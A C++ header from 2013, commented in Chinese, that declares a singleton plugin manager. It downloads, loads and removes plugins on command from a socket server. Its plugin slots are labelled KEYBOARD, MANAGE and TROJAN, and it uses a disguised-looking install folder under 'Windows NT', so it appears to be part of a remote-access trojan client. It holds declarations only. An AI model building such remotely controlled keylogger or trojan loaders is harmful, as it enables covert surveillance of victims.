/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief 插件管理类
* @author 刘成伟 chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

#ifndef __TSP_PLUGINMANAGER_H__
#define __TSP_PLUGINMANAGER_H__

#if 1
#include <list>
#include "../Manager.h"

#include "ddc_util.h"
#include "ddc_thread.h"
#include "ddc_singleton.hpp"
#include "PluginServerInfo.h"
#include "TspPluginIni.hpp"
#include "TspRecycle.h"
#include "macros.h"

#define TSP_PLUGIN_S_CONFIG_PATH ""						//插件文件所在目录
#define TSP_PLUGIN_S_CONFIG_NAME "cfg.ini"				//插件配置文件名
#define TSP_PLUGIN_S_DOWNLOAD_PATH "dd_01gcv\\"			//插件下载文件所在目录,下划线后面是随机写，怕在临时文件夹中冲突
#define TSP_PLUGIN_S_CONFIG_DLNAME "download_cfg.ini"	//插件下载时保存的文件名称
#define TSP_PLUGIN_S_MQ_PATH ":\\Program Files\\Windows NT\\Pinboll\\"					// 插件配置文件的头部标签

//去掉依赖
class CClientSocket;

/**
* @class CPlugServer
*
* @brief 这个类用来实现socket客户端，提供和socket服务端建立连接和释放连接
*/
class CPlugServer
{
	enum { WAIT_TIME = 10000 };

	// 数组中序号
	enum {	PLUG_ARRAY_NO_KEYBOARD=0,
			PLUG_ARRAY_NO_MANAGE=1,
			PLUG_ARRAY_NO_TROJAN=2,
			PLUG_ARRAY_NO_END=3	};

	friend class plugServer;		// cppunit test class
public:
	/// constrator
	CPlugServer(CClientSocket* _sock = NULL);

	/// destrator
	virtual ~CPlugServer();

	/// 设置本类使用的socket句柄
	void SetSocket(CClientSocket *_sock) { m_sock = _sock; };

	/// 获得本类使用的socket句柄
	CClientSocket *GetSocket() { return m_sock; };

	/**
	* 启动整个类的业务流程
	* @return 成功返回TRUE，否则返回FALSE
	*/	
	BOOL StartSrv();
	/**
	* 改变插件状态
	* @param pid 插件类型
	* @param flag 要改变的状态
	* @return 0 成功
	*/
	int Status(int pid,int flag);

	/**
	* 获得插件状态
	* @param pid 插件类型
	* @return 插件状态,取值CPluginInfo::枚举项
	*/
	int Status(int pid);

	/**	
	* 处理插件下载命令
	* @param lpBuffer client送过来的数据,跳过了命令字
	* @param nBuffLen 数据长度，减去了命令字
	* @return 0 成功
	*/
	int OnPluginRequest(void *lpBuffer,uint nBufLen);

	/**	
	* 处理插件卸载命令
	* @param lpBuffer client送过来的数据,跳过了命令字
	* @param nBuffLen 数据长度，减去了命令字
	* @return 0 成功
	*/
	int OnPluginRemove(void *lpBuffer,uint nBufLen);

	/**
	* 改变插件状态	
	* @param flag 要改变的状态
	* @return 0 成功
	*/
	int StatusAll(int flag);

	/**
	* 解析插件配置文件，根据配置文件停止和启动单个插件的功能
	* @return 成功返回TRUE，否则返回FALSE
	*/
	BOOL ProcessConfig(); 

	/**
	* 初始化，保存参数,需要将这些传给子插件
	* @param strHost 主机名
	* @param port 端口号
	*/
	void Init(const char *strHost,ushort port)
	{
		DDC_BOOL_RET(strHost==NULL);

		strncpy(m_plugParam.imp.szHost,strHost,MAX_PATH);
		m_plugParam.imp.wPort = port;
	};

	std::vector<CPlugServerInfo *> m_PluginList;			/// 插件列表,只有3项

private:	
	
	/** 
	* 下载插件配置文件
	* @param szSaveName 是路径+文件名称
	* @return 成功返回TRUE，否则返回FALSE
	*/
	BOOL DownloadConfig(const TCHAR *szSaveName);

	/**
	* 加载插件
	* @param dwFlag 标志位
	* @return 0 成功
	*/
	int ReloadPlugin(DWORD dwFlag = 0);	

	/**
	* 转pid为数组索引
	* @param pid 插件ID
	* @return >=0 插件在数组中的索引号
	* @return -1 不支持的插件
	*/
	static int PidToIndex(int pid);
private:	
	nm_ddc::CThreadMutex m_lock;					/// 同步锁
	CClientSocket *m_sock;							/// 保存的socket指针
	nm_ddc::Manual_Event m_hEvent;					/// event
	int m_err;										/// 下载的错误码
	CTspRecycle m_recycle;							/// 回收站类，负责删除临时文件	

	std::string m_szPluginDownLoadPath;				/// 插件下载目录
	std::string m_szPluginConfigPath;				/// 插件所在目录
	
	PLUGPARAM m_plugParam;							/// 插件间传递的参数
	TCHAR m_szModulePath[TSP_PLUGIN_PATH];			/// 安装路径，全局传进来		
};

/// 全局对象，singleton模式
typedef SingletonHolder<CPlugServer> Global_PlugManager;
#define GLOBAL_PLUGSERVER Global_PlugManager::instance()

#endif	//test switch

#endif	//__TSP_PLUGINMANAGER_H__
